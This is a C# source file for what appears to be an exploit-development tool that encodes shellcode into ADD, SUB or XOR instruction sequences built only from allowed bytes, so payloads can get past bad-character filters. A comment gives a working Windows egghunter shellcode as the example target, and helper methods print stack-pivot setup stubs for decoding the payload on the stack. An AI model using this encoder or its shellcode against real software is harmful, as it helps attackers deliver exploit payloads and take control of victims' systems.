using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;
using asm.encoder.Encoders;
using asm.encoder.Formatter;

namespace asm.encoder
{
    /* CLI Example:
     -source \x00\x00\x00\x00 
     -target \x90\x90\x90\x90\x90\x90\x90\x90\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x70\x65\x65\x70\x89\xd7\xaf\x75\xea\xaf\x75\xe7\xff\xe7 
     -allowed \x01\x02\x03\x04\x05\x06\x07\x08\x09\x0b\x0c\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3b\x3c\x3d\x3e\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f 
     -add 
     -sub 
     -xor
     * */


    class Program
    {
        static void SetupOption1()
        {
            Console.WriteLine($"{string.Empty.PadRight(20, '=')}{nameof(SetupOption1)}{string.Empty.PadRight(20, '=')}");
            Console.WriteLine($"{"54",-20}; PUSH ESP");
            Console.WriteLine($"POP <REG>");
            Console.WriteLine($"ADD <REG>, <STACK_SPACE>");
            Console.WriteLine($"PUSH <REG>");
            Console.WriteLine($"{"5C",-20}; POP ESP");
            Console.WriteLine($"{string.Empty.PadRight(20, '=')}{nameof(SetupOption1)}{string.Empty.PadRight(20, '=')}");
            Console.WriteLine(Environment.NewLine);
        }

        static void SetupOption2()
        {
            Console.WriteLine($"{string.Empty.PadRight(20, '=')}{nameof(SetupOption2)}{string.Empty.PadRight(20, '=')}");
            Console.WriteLine($"-0x05: {"EB03",-20}; JMP 'CALL POP <REG>'");
            Console.WriteLine($"-0x03: POP <REG>");
            Console.WriteLine($"-0x02: PUSH <REG>");
            Console.WriteLine($"-0x01: {"C3",-20}; RETN");
            Console.WriteLine($"---->: {"E8F8FFFFFF",-20}; CALL 'POP <REG>'");
            Console.WriteLine($"OPTNL: MOV <REG2>, ESP; SAVE ESP FOR LATER RESTORE");
            Console.WriteLine($"+0x05: MOV ESP, <REG>");
            Console.WriteLine($"-0x07: ADD ESP, <STACK_SPACE>");
            Console.WriteLine($"{string.Empty.PadRight(20, '=')}{nameof(SetupOption2)}{string.Empty.PadRight(20, '=')}");
            Console.WriteLine(Environment.NewLine);
        }

        static void SetupOption3()
        {
            Console.WriteLine($"{string.Empty.PadRight(20, '=')}{nameof(SetupOption3)}{string.Empty.PadRight(20, '=')}");
            Console.WriteLine($"-0x04: {"EB02",-20}; JMP --> 'CALL'");
            Console.WriteLine($"-0x02: {"EB05",-20}; JMP --> 'POP <REG>'");
            Console.WriteLine($"---->: {"E8F8FFFFFF",-20}; CALL");
            Console.WriteLine($"OPTNL: MOV <REG2>, ESP; SAVE ESP FOR LATER RESTORE");
            Console.WriteLine($"+0x05: POP <REG>");
            Console.WriteLine($"+0x05: MOV ESP, <REG>");
            Console.WriteLine($"-0x07: ADD ESP, <STACK_SPACE>");
            Console.WriteLine($"{string.Empty.PadRight(20, '=')}{nameof(SetupOption3)}{string.Empty.PadRight(20, '=')}");
            Console.WriteLine(Environment.NewLine);
        }

        static void Main(string[] args)
        {
            try
            {
                Console.WriteLine($"Endian Format: {(BitConverter.IsLittleEndian ? "LITTLE ENDIAN" : "BIG ENDIAN")}");
                Console.WriteLine($"When using this tool to find encoded ADD/SUB amount to increment register, input 'target' as LITTLE ENDIAN format.");

                Validator.ValidateArgs(args, out byte[] sourceBytes, out byte[] targetBytes, out byte[] allowedBytes, out bool useAddEncoder, out bool useSubEncoder, out bool useXorEncoder, out IFormatter formatter, out Endian endian);

                SetupOption1();
                SetupOption2();
                SetupOption3();

                BaseEncoder addSubEncoder = null;
                BaseEncoder xorEncoder = null;

                if (useAddEncoder || useSubEncoder)
                {
                    addSubEncoder = new AddSubEncoder(allowedBytes);
                }
                if (useXorEncoder)
                {
                    xorEncoder = new XorEncoder(allowedBytes);
                }

                int encodedSize = 0;
                OpCode source = new OpCode(BitConverter.ToUInt32(sourceBytes, 0));
                for (int i = targetBytes.Length - 4; i >= 0; i -= 4)
                {
                    AsmEncoding addEncoding = null;
                    AsmEncoding subEncoding = null;
                    AsmEncoding xorEncoding = null;

                    OpCode target = new OpCode(BitConverter.ToUInt32(targetBytes, i));

                    if (useAddEncoder)
                    {
                        addEncoding = addSubEncoder.EncodeOperation(source, target, Operation.ADD);
                    }
                    if (useSubEncoder)
                    {
                        subEncoding = addSubEncoder.EncodeOperation(source, target, Operation.SUB);
                    }
                    if (useXorEncoder)
                    {
                        xorEncoding = xorEncoder.EncodeOperation(source, target, Operation.XOR);
                    }

                    AsmEncoding result = addEncoding;
                    if (subEncoding != null && (result == null || subEncoding.Transitions.Count < result.Transitions.Count))
                    {
                        result = subEncoding;
                    }
                    if (xorEncoding != null && (result == null || xorEncoding.Transitions.Count < result.Transitions.Count))
                    {
                        result = xorEncoding;
                    }

                    Console.WriteLine(formatter.Format(result, endian));
                    encodedSize += (result.Transitions.Count * 5) + 1; // 5 bytes per encoding step; 1 byte for push
                    source = target;
                }

                Console.WriteLine($"Total Size of Payload: {targetBytes.Length}: 0x{targetBytes.Length:X2}");
                Console.WriteLine($"Total Size of Encoded: {encodedSize}: 0x{encodedSize:X2}");
                Console.WriteLine($"Total stack space: {targetBytes.Length + encodedSize}: 0x{(targetBytes.Length + encodedSize):X2}");
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
                return;
            }
        }
    }
}